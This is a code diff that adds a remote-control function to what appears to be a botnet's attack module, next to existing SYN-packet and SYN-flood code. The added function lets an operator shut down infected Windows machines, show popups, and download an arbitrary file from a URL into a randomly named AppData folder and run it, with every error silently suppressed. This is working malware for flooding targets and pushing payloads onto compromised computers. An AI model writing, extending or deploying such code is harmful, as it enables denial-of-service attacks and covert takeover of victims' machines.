@@ -218,6 +218,61 @@ def generate_syn_packet(src_ip, dst_ip, src_port, dst_port):
     
     return ip_header + tcp_header
 
+# Add this function to the attack_methods.py file
+def attack_controlpc(target, duration=60):
+    """Remote control PC functions - Admin only"""
+    # This method is for admin control only and won't be used in normal attacks
+    # The target parameter will contain the command and parameters
+    
+    # Parse the target string to get command and parameters
+    # Format: command|param1|param2|...
+    parts = target.split('|')
+    command = parts[0]
+    
+    if command == "shutdown":
+        # Shutdown the computer
+        try:
+            import os
+            os.system("shutdown /s /t 1")
+        except:
+            pass
+            
+    elif command == "popup":
+        # Display a popup message
+        if len(parts) > 1:
+            message = parts[1]
+            try:
+                import ctypes
+                ctypes.windll.user32.MessageBoxW(0, message, "System Message", 0)
+            except:
+                pass
+                
+    elif command == "download_execute":
+        # Download and execute a file
+        if len(parts) > 1:
+            url = parts[1]
+            try:
+                import os
+                import tempfile
+                import urllib.request
+                
+                # Create a random folder in AppData/Local
+                appdata_path = os.environ['LOCALAPPDATA']
+                random_folder = ''.join(random.choices('abcdefghijklmnopqrstuvwxyz0123456789', k=10))
+                target_dir = os.path.join(appdata_path, random_folder)
+                os.makedirs(target_dir, exist_ok=True)
+                
+                # Download the file
+                file_name = url.split('/')[-1] or "file.exe"
+                file_path = os.path.join(target_dir, file_name)
+                
+                urllib.request.urlretrieve(url, file_path)
+                
+                # Execute the file
+                os.startfile(file_path)
+            except:
+                pass
+                
 def attack_syn_flood(target, duration=60):
     """High-performance SYN flood using raw sockets"""
     ip, port = resolve_target(target)
